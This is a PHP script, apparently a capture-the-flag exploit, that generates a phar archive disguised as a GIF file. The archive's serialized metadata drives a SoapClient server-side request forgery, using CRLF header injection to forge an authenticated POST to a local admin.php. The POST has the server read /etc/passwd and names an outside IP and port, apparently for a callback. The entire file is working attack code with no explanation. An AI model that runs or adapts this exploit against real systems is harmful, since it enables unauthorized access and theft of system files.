<?php

if (@$_SERVER['argv'][1] != 1) {
	system('php -d phar.readonly=0 gen_phar.php 1');
	exit;
}

@unlink('./exp.phar');
@unlink('./exp.gif');

class File {
	public $file_name = "";
	public $func = "SoapClient";

	function __construct($data) {
		$target = "http://127.0.0.1:8185/admin.php";
		$post_string = http_build_query($data) . "\r\n";
		$headers = [
			'Cookie: PHPSESSID=vk',
		];
		$this->file_name = [
			null,
			array('location' => $target,
				'user_agent' => str_replace('^^', "\r\n", 'wupco^^Content-Type: application/x-www-form-urlencoded^^' . join('^^', $headers) . 'Content-Length: ' . (string) strlen($post_string) . '^^^^' . $post_string),
				'uri' => 'hello'),
		];
	}
}
function getPostData($clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3, $ip = "47.101.138.236", $port = 6666) {
	return [
		"admin" => 1,
		"ip" => $ip,
		"port" => $port,
		"clazz" => $clazz,
		"func1" => $func1,
		"func2" => $func2,
		"func3" => $func3,
		"arg1" => $arg1,
		"arg2" => $arg2,
		"arg3" => $arg3,
	];
}
$data = getPostData("finfo", "file", "file", "file", "/etc/passwd", "/etc/passwd", "/etc/passwd");
$pl = new File($data);

$p = new Phar('./exp.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a<script language="php">__HALT_COMPILER();</script>');
$p->setMetadata($pl);
$p->addFromString('v.txt', '666');
$p->stopBuffering();

copy('./exp.phar', "./exp.gif");
unlink('./exp.phar');
echo "gen exp success!\n\r";

?>